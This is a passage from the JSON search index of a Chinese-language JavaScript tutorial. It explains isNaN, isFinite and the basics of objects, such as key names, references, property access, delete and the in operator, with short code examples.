) // NaN Number ( '' ) // 0 parseFloat ( '123.45#' ) // 123.45 Number ( '123.45#' ) // NaN","title":"parseFloat()"},{"location":"types/number/#isnan","text":"isNaN \u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u4e3a NaN \u3002 1 2 isNaN ( NaN ) // true isNaN ( 123 ) // false \u4f46\u662f\uff0c isNaN \u53ea\u5bf9\u6570\u503c\u6709\u6548\uff0c\u5982\u679c\u4f20\u5165\u5176\u4ed6\u503c\uff0c\u4f1a\u88ab\u5148\u8f6c\u6210\u6570\u503c\u3002\u6bd4\u5982\uff0c\u4f20\u5165\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u5b57\u7b26\u4e32\u4f1a\u88ab\u5148\u8f6c\u6210 NaN \uff0c\u6240\u4ee5\u6700\u540e\u8fd4\u56de true \uff0c\u8fd9\u4e00\u70b9\u8981\u7279\u522b\u5f15\u8d77\u6ce8\u610f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c isNaN \u4e3a true \u7684\u503c\uff0c\u6709\u53ef\u80fd\u4e0d\u662f NaN \uff0c\u800c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002 1 2 3 isNaN ( 'Hello' ) // true // \u76f8\u5f53\u4e8e isNaN ( Number ( 'Hello' )) // true \u51fa\u4e8e\u540c\u6837\u7684\u539f\u56e0\uff0c\u5bf9\u4e8e\u5bf9\u8c61\u548c\u6570\u7ec4\uff0c isNaN \u4e5f\u8fd4\u56de true \u3002 1 2 3 4 5 6 7 isNaN ({}) // true // \u7b49\u540c\u4e8e isNaN ( Number ({})) // true isNaN ([ 'xzy' ]) // true // \u7b49\u540c\u4e8e isNaN ( Number ([ 'xzy' ])) // true \u4f46\u662f\uff0c\u5bf9\u4e8e\u7a7a\u6570\u7ec4\u548c\u53ea\u6709\u4e00\u4e2a\u6570\u503c\u6210\u5458\u7684\u6570\u7ec4\uff0c isNaN \u8fd4\u56de false \u3002 1 2 3 isNaN ([]) // false isNaN ([ 123 ]) // false isNaN ([ '123' ]) // false \u4e0a\u9762\u4ee3\u7801\u4e4b\u6240\u4ee5\u8fd4\u56de false \uff0c\u539f\u56e0\u662f\u8fd9\u4e9b\u6570\u7ec4\u80fd\u88ab Number \u51fd\u6570\u8f6c\u6210\u6570\u503c\uff0c\u8bf7\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u56e0\u6b64\uff0c\u4f7f\u7528 isNaN \u4e4b\u524d\uff0c\u6700\u597d\u5224\u65ad\u4e00\u4e0b\u6570\u636e\u7c7b\u578b\u3002 1 2 3 function myIsNaN ( value ) { return typeof value === 'number' && isNaN ( value ); } \u5224\u65ad NaN \u66f4\u53ef\u9760\u7684\u65b9\u6cd5\u662f\uff0c\u5229\u7528 NaN \u4e3a\u552f\u4e00\u4e0d\u7b49\u4e8e\u81ea\u8eab\u7684\u503c\u7684\u8fd9\u4e2a\u7279\u70b9\uff0c\u8fdb\u884c\u5224\u65ad\u3002 1 2 3 function myIsNaN ( value ) { return value !== value ; }","title":"isNaN()"},{"location":"types/number/#isfinite","text":"isFinite \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u503c\u662f\u5426\u4e3a\u6b63\u5e38\u7684\u6570\u503c\u3002 1 2 3 4 5 6 isFinite ( Infinity ) // false isFinite ( - Infinity ) // false isFinite ( NaN ) // false isFinite ( undefined ) // false isFinite ( null ) // true isFinite ( - 1 ) // true \u9664\u4e86 Infinity \u3001 -Infinity \u3001 NaN \u548c undefined \u8fd9\u51e0\u4e2a\u503c\u4f1a\u8fd4\u56de false \uff0c isFinite \u5bf9\u4e8e\u5176\u4ed6\u7684\u6570\u503c\u90fd\u4f1a\u8fd4\u56de true \u3002","title":"isFinite()"},{"location":"types/number/#_11","text":"Dr. Axel Rauschmayer, How numbers are encoded in JavaScript Humphry, JavaScript \u4e2d Number \u7684\u4e00\u4e9b\u8868\u793a\u4e0a/\u4e0b\u9650","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"types/object/","text":"\u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 \u751f\u6210\u65b9\u6cd5 \u00b6 \u5bf9\u8c61\uff08object\uff09\u662f JavaScript \u8bed\u8a00\u7684\u6838\u5fc3\u6982\u5ff5\uff0c\u4e5f\u662f\u6700\u91cd\u8981\u7684\u6570\u636e\u7c7b\u578b\u3002 \u4ec0\u4e48\u662f\u5bf9\u8c61\uff1f\u7b80\u5355\u8bf4\uff0c\u5bf9\u8c61\u5c31\u662f\u4e00\u7ec4\u201c\u952e\u503c\u5bf9\u201d\uff08key-value\uff09\u7684\u96c6\u5408\uff0c\u662f\u4e00\u79cd\u65e0\u5e8f\u7684\u590d\u5408\u6570\u636e\u96c6\u5408\u3002 1 2 3 4 var obj = { foo : 'Hello' , bar : 'World' }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5927\u62ec\u53f7\u5c31\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u88ab\u8d4b\u503c\u7ed9\u53d8\u91cf obj \uff0c\u6240\u4ee5\u53d8\u91cf obj \u5c31\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u5185\u90e8\u5305\u542b\u4e24\u4e2a\u952e\u503c\u5bf9\uff08\u53c8\u79f0\u4e3a\u4e24\u4e2a\u201c\u6210\u5458\u201d\uff09\uff0c\u7b2c\u4e00\u4e2a\u952e\u503c\u5bf9\u662f foo: 'Hello' \uff0c\u5176\u4e2d foo \u662f\u201c\u952e\u540d\u201d\uff08\u6210\u5458\u7684\u540d\u79f0\uff09\uff0c\u5b57\u7b26\u4e32 Hello \u662f\u201c\u952e\u503c\u201d\uff08\u6210\u5458\u7684\u503c\uff09\u3002\u952e\u540d\u4e0e\u952e\u503c\u4e4b\u95f4\u7528\u5192\u53f7\u5206\u9694\u3002\u7b2c\u4e8c\u4e2a\u952e\u503c\u5bf9\u662f bar: 'World' \uff0c bar \u662f\u952e\u540d\uff0c World \u662f\u952e\u503c\u3002\u4e24\u4e2a\u952e\u503c\u5bf9\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u3002 \u952e\u540d \u00b6 \u5bf9\u8c61\u7684\u6240\u6709\u952e\u540d\u90fd\u662f\u5b57\u7b26\u4e32\uff08ES6 \u53c8\u5f15\u5165\u4e86 Symbol \u503c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u952e\u540d\uff09\uff0c\u6240\u4ee5\u52a0\u4e0d\u52a0\u5f15\u53f7\u90fd\u53ef\u4ee5\u3002\u4e0a\u9762\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 var obj = { 'foo' : 'Hello' , 'bar' : 'World' }; \u5982\u679c\u952e\u540d\u662f\u6570\u503c\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var obj = { 1 : 'a' , 3.2 : 'b' , 1e2 : true , 1e-2 : true , .234 : true , 0xFF : true }; obj // Object { // 1: \"a\", // 3.2: \"b\", // 100: true, // 0.01: true, // 0.234: true, // 255: true // } obj [ '100' ] // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u6240\u6709\u952e\u540d\u867d\u7136\u770b\u4e0a\u53bb\u50cf\u6570\u503c\uff0c\u5b9e\u9645\u4e0a\u90fd\u88ab\u81ea\u52a8\u8f6c\u6210\u4e86\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u952e\u540d\u4e0d\u7b26\u5408\u6807\u8bc6\u540d\u7684\u6761\u4ef6\uff08\u6bd4\u5982\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a\u6570\u5b57\uff0c\u6216\u8005\u542b\u6709\u7a7a\u683c\u6216\u8fd0\u7b97\u7b26\uff09\uff0c\u4e14\u4e5f\u4e0d\u662f\u6570\u5b57\uff0c\u5219\u5fc5\u987b\u52a0\u4e0a\u5f15\u53f7\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u62a5\u9519 var obj = { 1 p : 'Hello World' }; // \u4e0d\u62a5\u9519 var obj = { '1p' : 'Hello World' , 'h w' : 'Hello World' , 'p+q' : 'Hello World' }; \u4e0a\u9762\u5bf9\u8c61\u7684\u4e09\u4e2a\u952e\u540d\uff0c\u90fd\u4e0d\u7b26\u5408\u6807\u8bc6\u540d\u7684\u6761\u4ef6\uff0c\u6240\u4ee5\u5fc5\u987b\u52a0\u4e0a\u5f15\u53f7\u3002 \u5bf9\u8c61\u7684\u6bcf\u4e00\u4e2a\u952e\u540d\u53c8\u79f0\u4e3a\u201c\u5c5e\u6027\u201d\uff08property\uff09\uff0c\u5b83\u7684\u201c\u952e\u503c\u201d\u53ef\u4ee5\u662f\u4efb\u4f55\u6570\u636e\u7c7b\u578b\u3002\u5982\u679c\u4e00\u4e2a\u5c5e\u6027\u7684\u503c\u4e3a\u51fd\u6570\uff0c\u901a\u5e38\u628a\u8fd9\u4e2a\u5c5e\u6027\u79f0\u4e3a\u201c\u65b9\u6cd5\u201d\uff0c\u5b83\u53ef\u4ee5\u50cf\u51fd\u6570\u90a3\u6837\u8c03\u7528\u3002 1 2 3 4 5 6 7 var obj = { p : function ( x ) { return 2 * x ; } }; obj . p ( 1 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u5c5e\u6027 p \uff0c\u5c31\u6307\u5411\u4e00\u4e2a\u51fd\u6570\u3002 \u5982\u679c\u5c5e\u6027\u7684\u503c\u8fd8\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c31\u5f62\u6210\u4e86\u94fe\u5f0f\u5f15\u7528\u3002 1 2 3 4 5 var o1 = {}; var o2 = { bar : 'hello' }; o1 . foo = o2 ; o1 . foo . bar // \"hello\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 o1 \u7684\u5c5e\u6027 foo \u6307\u5411\u5bf9\u8c61 o2 \uff0c\u5c31\u53ef\u4ee5\u94fe\u5f0f\u5f15\u7528 o2 \u7684\u5c5e\u6027\u3002 \u5bf9\u8c61\u7684\u5c5e\u6027\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\uff0c\u6700\u540e\u4e00\u4e2a\u5c5e\u6027\u540e\u9762\u53ef\u4ee5\u52a0\u9017\u53f7\uff08trailing comma\uff09\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u52a0\u3002 1 2 3 4 var obj = { p : 123 , m : function () { ... }, } \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c m \u5c5e\u6027\u540e\u9762\u7684\u90a3\u4e2a\u9017\u53f7\uff0c\u6709\u6ca1\u6709\u90fd\u53ef\u4ee5\u3002 \u5c5e\u6027\u53ef\u4ee5\u52a8\u6001\u521b\u5efa\uff0c\u4e0d\u5fc5\u5728\u5bf9\u8c61\u58f0\u660e\u65f6\u5c31\u6307\u5b9a\u3002 1 2 3 var obj = {}; obj . foo = 123 ; obj . foo // 123 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u76f4\u63a5\u5bf9 obj \u5bf9\u8c61\u7684 foo \u5c5e\u6027\u8d4b\u503c\uff0c\u7ed3\u679c\u5c31\u5728\u8fd0\u884c\u65f6\u521b\u5efa\u4e86 foo \u5c5e\u6027\u3002 \u5bf9\u8c61\u7684\u5f15\u7528 \u00b6 \u5982\u679c\u4e0d\u540c\u7684\u53d8\u91cf\u540d\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48\u5b83\u4eec\u90fd\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\u3002\u4fee\u6539\u5176\u4e2d\u4e00\u4e2a\u53d8\u91cf\uff0c\u4f1a\u5f71\u54cd\u5230\u5176\u4ed6\u6240\u6709\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 var o1 = {}; var o2 = o1 ; o1 . a = 1 ; o2 . a // 1 o2 . b = 2 ; o1 . b // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c o1 \u548c o2 \u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u56e0\u6b64\u4e3a\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u53d8\u91cf\u6dfb\u52a0\u5c5e\u6027\uff0c\u53e6\u4e00\u4e2a\u53d8\u91cf\u90fd\u53ef\u4ee5\u8bfb\u5199\u8be5\u5c5e\u6027\u3002 \u6b64\u65f6\uff0c\u5982\u679c\u53d6\u6d88\u67d0\u4e00\u4e2a\u53d8\u91cf\u5bf9\u4e8e\u539f\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u53e6\u4e00\u4e2a\u53d8\u91cf\u3002 1 2 3 4 5 var o1 = {}; var o2 = o1 ; o1 = 1 ; o2 // {} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c o1 \u548c o2 \u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e o1 \u7684\u503c\u53d8\u4e3a1\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u5bf9 o2 \u4ea7\u751f\u5f71\u54cd\uff0c o2 \u8fd8\u662f\u6307\u5411\u539f\u6765\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002 \u4f46\u662f\uff0c\u8fd9\u79cd\u5f15\u7528\u53ea\u5c40\u9650\u4e8e\u5bf9\u8c61\uff0c\u5982\u679c\u4e24\u4e2a\u53d8\u91cf\u6307\u5411\u540c\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002\u90a3\u4e48\uff0c\u53d8\u91cf\u8fd9\u65f6\u90fd\u662f\u503c\u7684\u62f7\u8d1d\u3002 1 2 3 4 5 var x = 1 ; var y = x ; x = 2 ; y // 1 \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u5f53 x \u7684\u503c\u53d1\u751f\u53d8\u5316\u540e\uff0c y \u7684\u503c\u5e76\u4e0d\u53d8\uff0c\u8fd9\u5c31\u8868\u793a y \u548c x \u5e76\u4e0d\u662f\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\u3002 \u8868\u8fbe\u5f0f\u8fd8\u662f\u8bed\u53e5\uff1f \u00b6 \u5bf9\u8c61\u91c7\u7528\u5927\u62ec\u53f7\u8868\u793a\uff0c\u8fd9\u5bfc\u81f4\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u5982\u679c\u884c\u9996\u662f\u4e00\u4e2a\u5927\u62ec\u53f7\uff0c\u5b83\u5230\u5e95\u662f\u8868\u8fbe\u5f0f\u8fd8\u662f\u8bed\u53e5\uff1f 1 { foo : 123 } JavaScript \u5f15\u64ce\u8bfb\u5230\u4e0a\u9762\u8fd9\u884c\u4ee3\u7801\uff0c\u4f1a\u53d1\u73b0\u53ef\u80fd\u6709\u4e24\u79cd\u542b\u4e49\u3002\u7b2c\u4e00\u79cd\u53ef\u80fd\u662f\uff0c\u8fd9\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u4e00\u4e2a\u5305\u542b foo \u5c5e\u6027\u7684\u5bf9\u8c61\uff1b\u7b2c\u4e8c\u79cd\u53ef\u80fd\u662f\uff0c\u8fd9\u662f\u4e00\u4e2a\u8bed\u53e5\uff0c\u8868\u793a\u4e00\u4e2a\u4ee3\u7801\u533a\u5757\uff0c\u91cc\u9762\u6709\u4e00\u4e2a\u6807\u7b7e foo \uff0c\u6307\u5411\u8868\u8fbe\u5f0f 123 \u3002 \u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u6b67\u4e49\uff0cJavaScript \u5f15\u64ce\u7684\u505a\u6cd5\u662f\uff0c\u5982\u679c\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u65e0\u6cd5\u786e\u5b9a\u662f\u5bf9\u8c61\u8fd8\u662f\u4ee3\u7801\u5757\uff0c\u4e00\u5f8b\u89e3\u91ca\u4e3a\u4ee3\u7801\u5757\u3002 1 { console . log ( 123 ) } // 123 \u4e0a\u9762\u7684\u8bed\u53e5\u662f\u4e00\u4e2a\u4ee3\u7801\u5757\uff0c\u800c\u4e14\u53ea\u6709\u89e3\u91ca\u4e3a\u4ee3\u7801\u5757\uff0c\u624d\u80fd\u6267\u884c\u3002 \u5982\u679c\u8981\u89e3\u91ca\u4e3a\u5bf9\u8c61\uff0c\u6700\u597d\u5728\u5927\u62ec\u53f7\u524d\u52a0\u4e0a\u5706\u62ec\u53f7\u3002\u56e0\u4e3a\u5706\u62ec\u53f7\u7684\u91cc\u9762\uff0c\u53ea\u80fd\u662f\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u786e\u4fdd\u5927\u62ec\u53f7\u53ea\u80fd\u89e3\u91ca\u4e3a\u5bf9\u8c61\u3002 1 2 ({ foo : 123 }) // \u6b63\u786e ({ console . log ( 123 ) }) // \u62a5\u9519 \u8fd9\u79cd\u5dee\u5f02\u5728 eval \u8bed\u53e5\uff08\u4f5c\u7528\u662f\u5bf9\u5b57\u7b26\u4e32\u6c42\u503c\uff09\u4e2d\u53cd\u6620\u5f97\u6700\u660e\u663e\u3002 1 2 eval ( '{foo: 123}' ) // 123 eval ( '({foo: 123})' ) // {foo: 123} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u6ca1\u6709\u5706\u62ec\u53f7\uff0c eval \u5c06\u5176\u7406\u89e3\u4e3a\u4e00\u4e2a\u4ee3\u7801\u5757\uff1b\u52a0\u4e0a\u5706\u62ec\u53f7\u4ee5\u540e\uff0c\u5c31\u7406\u89e3\u6210\u4e00\u4e2a\u5bf9\u8c61\u3002 \u5c5e\u6027\u7684\u64cd\u4f5c \u00b6 \u5c5e\u6027\u7684\u8bfb\u53d6 \u00b6 \u8bfb\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff0c\u8fd8\u6709\u4e00\u79cd\u662f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002 1 2 3 4 5 6 var obj = { p : 'Hello World' }; obj . p // \"Hello World\" obj [ 'p' ] // \"Hello World\" \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u91c7\u7528\u70b9\u8fd0\u7b97\u7b26\u548c\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u8bfb\u53d6\u5c5e\u6027 p \u3002 \u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u952e\u540d\u5fc5\u987b\u653e\u5728\u5f15\u53f7\u91cc\u9762\uff0c\u5426\u5219\u4f1a\u88ab\u5f53\u4f5c\u53d8\u91cf\u5904\u7406\u3002 1 2 3 4 5 6 7 8 9 var foo = 'bar' ; var obj = { foo : 1 , bar : 2 }; obj . foo // 1 obj [ foo ] // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f15\u7528\u5bf9\u8c61 obj \u7684 foo \u5c5e\u6027\u65f6\uff0c\u5982\u679c\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff0c foo \u5c31\u662f\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u4f46\u662f\u4e0d\u4f7f\u7528\u5f15\u53f7\uff0c\u90a3\u4e48 foo \u5c31\u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u6307\u5411\u5b57\u7b26\u4e32 bar \u3002 \u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u5185\u90e8\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\u3002 1 2 obj [ 'hello' + ' world' ] obj [ 3 + 3 ] \u6570\u5b57\u952e\u53ef\u4ee5\u4e0d\u52a0\u5f15\u53f7\uff0c\u56e0\u4e3a\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 var obj = { 0.7 : 'Hello World' }; obj [ '0.7' ] // \"Hello World\" obj [ 0.7 ] // \"Hello World\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u6570\u5b57\u952e 0.7 \uff0c\u52a0\u4e0d\u52a0\u5f15\u53f7\u90fd\u53ef\u4ee5\uff0c\u56e0\u4e3a\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u6570\u503c\u952e\u540d\u4e0d\u80fd\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff08\u56e0\u4e3a\u4f1a\u88ab\u5f53\u6210\u5c0f\u6570\u70b9\uff09\uff0c\u53ea\u80fd\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002 1 2 3 4 5 6 var obj = { 123 : 'hello world' }; obj .123 // \u62a5\u9519 obj [ 123 ] // \"hello world\" \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5bf9\u6570\u503c\u952e\u540d 123 \u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff0c\u7ed3\u679c\u62a5\u9519\u3002\u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u7ed3\u679c\u5c31\u662f\u6b63\u786e\u7684\u3002 \u5c5e\u6027\u7684\u8d4b\u503c \u00b6 \u70b9\u8fd0\u7b97\u7b26\u548c\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u7528\u6765\u8bfb\u53d6\u503c\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u8d4b\u503c\u3002 1 2 3 4 var obj = {}; obj . foo = 'Hello' ; obj [ 'bar' ] = 'World' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5206\u522b\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\u548c\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u5bf9\u5c5e\u6027\u8d4b\u503c\u3002 JavaScript \u5141\u8bb8\u5c5e\u6027\u7684\u201c\u540e\u7ed1\u5b9a\u201d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f60\u53ef\u4ee5\u5728\u4efb\u610f\u65f6\u523b\u65b0\u589e\u5c5e\u6027\uff0c\u6ca1\u5fc5\u8981\u5728\u5b9a\u4e49\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u5c31\u5b9a\u4e49\u597d\u5c5e\u6027\u3002 1 2 3 4 5 6 var obj = { p : 1 }; // \u7b49\u4ef7\u4e8e var obj = {}; obj . p = 1 ; \u5c5e\u6027\u7684\u67e5\u770b \u00b6 \u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u672c\u8eab\u7684\u6240\u6709\u5c5e\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528 Object.keys \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 var obj = { key1 : 1 , key2 : 2 }; Object . keys ( obj ); // ['key1', 'key2'] \u5c5e\u6027\u7684\u5220\u9664\uff1adelete \u547d\u4ee4 \u00b6 delete \u547d\u4ee4\u7528\u4e8e\u5220\u9664\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5220\u9664\u6210\u529f\u540e\u8fd4\u56de true \u3002 1 2 3 4 5 6 var obj = { p : 1 }; Object . keys ( obj ) // [\"p\"] delete obj . p // true obj . p // undefined Object . keys ( obj ) // [] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c delete \u547d\u4ee4\u5220\u9664\u5bf9\u8c61 obj \u7684 p \u5c5e\u6027\u3002\u5220\u9664\u540e\uff0c\u518d\u8bfb\u53d6 p \u5c5e\u6027\u5c31\u4f1a\u8fd4\u56de undefined \uff0c\u800c\u4e14 Object.keys \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4e5f\u4e0d\u518d\u5305\u62ec\u8be5\u5c5e\u6027\u3002 \u6ce8\u610f\uff0c\u5220\u9664\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c delete \u4e0d\u62a5\u9519\uff0c\u800c\u4e14\u8fd4\u56de true \u3002 1 2 var obj = {}; delete obj . p // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u5e76\u6ca1\u6709 p \u5c5e\u6027\uff0c\u4f46\u662f delete \u547d\u4ee4\u7167\u6837\u8fd4\u56de true \u3002\u56e0\u6b64\uff0c\u4e0d\u80fd\u6839\u636e delete \u547d\u4ee4\u7684\u7ed3\u679c\uff0c\u8ba4\u5b9a\u67d0\u4e2a\u5c5e\u6027\u662f\u5b58\u5728\u7684\u3002 \u53ea\u6709\u4e00\u79cd\u60c5\u51b5\uff0c delete \u547d\u4ee4\u4f1a\u8fd4\u56de false \uff0c\u90a3\u5c31\u662f\u8be5\u5c5e\u6027\u5b58\u5728\uff0c\u4e14\u4e0d\u5f97\u5220\u9664\u3002 1 2 3 4 5 6 7 var obj = Object . defineProperty ({}, 'p' , { value : 123 , configurable : false }); obj . p // 123 delete obj . p // false \u4e0a\u9762\u4ee3\u7801\u4e4b\u4e2d\uff0c\u5bf9\u8c61 obj \u7684 p \u5c5e\u6027\u662f\u4e0d\u80fd\u5220\u9664\u7684\uff0c\u6240\u4ee5 delete \u547d\u4ee4\u8fd4\u56de false \uff08\u5173\u4e8e Object.defineProperty \u65b9\u6cd5\u7684\u4ecb\u7ecd\uff0c\u8bf7\u770b\u300a\u6807\u51c6\u5e93\u300b\u7684 Object \u5bf9\u8c61\u4e00\u7ae0\uff09\u3002 \u53e6\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c delete \u547d\u4ee4\u53ea\u80fd\u5220\u9664\u5bf9\u8c61\u672c\u8eab\u7684\u5c5e\u6027\uff0c\u65e0\u6cd5\u5220\u9664\u7ee7\u627f\u7684\u5c5e\u6027\uff08\u5173\u4e8e\u7ee7\u627f\u53c2\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u7ae0\u8282\uff09\u3002 1 2 3 var obj = {}; delete obj . toString // true obj . toString // function toString() { [native code] } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString \u662f\u5bf9\u8c61 obj \u7ee7\u627f\u7684\u5c5e\u6027\uff0c\u867d\u7136 delete \u547d\u4ee4\u8fd4\u56de true \uff0c\u4f46\u8be5\u5c5e\u6027\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u4f9d\u7136\u5b58\u5728\u3002\u8fd9\u4e2a\u4f8b\u5b50\u8fd8\u8bf4\u660e\uff0c\u5373\u4f7f delete \u8fd4\u56de true \uff0c\u8be5\u5c5e\u6027\u4f9d\u7136\u53ef\u80fd\u8bfb\u53d6\u5230\u503c\u3002 \u5c5e\u6027\u662f\u5426\u5b58\u5728\uff1ain \u8fd0\u7b97\u7b26 \u00b6 in \u8fd0\u7b97\u7b26\u7528\u4e8e\u68c0\u67e5\u5bf9\u8c61\u662f\u5426\u5305\u542b\u67d0\u4e2a\u5c5e\u6027\uff08\u6ce8\u610f\uff0c\u68c0\u67e5\u7684\u662f\u952e\u540d\uff0c\u4e0d\u662f\u952e\u503c\uff09\uff0c\u5982\u679c\u5305\u542b\u5c31\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \u3002\u5b83\u7684\u5de6\u8fb9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c5e\u6027\u540d\uff0c\u53f3\u8fb9\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002 1 2 3 var obj = { p : 1 }; 'p' in obj // true 'toString' in obj // true in \u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u5b83\u4e0d\u80fd\u8bc6\u522b\u54ea\u4e9b\u5c5e\u6027\u662f\u5bf9\u8c61\u81ea\u8eab\u7684\uff0c\u54ea\u4e9b\u5c5e\u6027\u662f\u7ee7\u627f\u7684\u3002\u5c31\u50cf\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u672c\u8eab\u5e76\u6ca1\u6709 toString \u5c5e\u6027\uff0c\u4f46\u662f in \u8fd0\u7b97\u7b26\u4f1a\u8fd4\u56de true \uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5c5e\u6027\u662f\u7ee7\u627f\u7684\u3002 \u8fd9\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u7684 hasOwnProperty 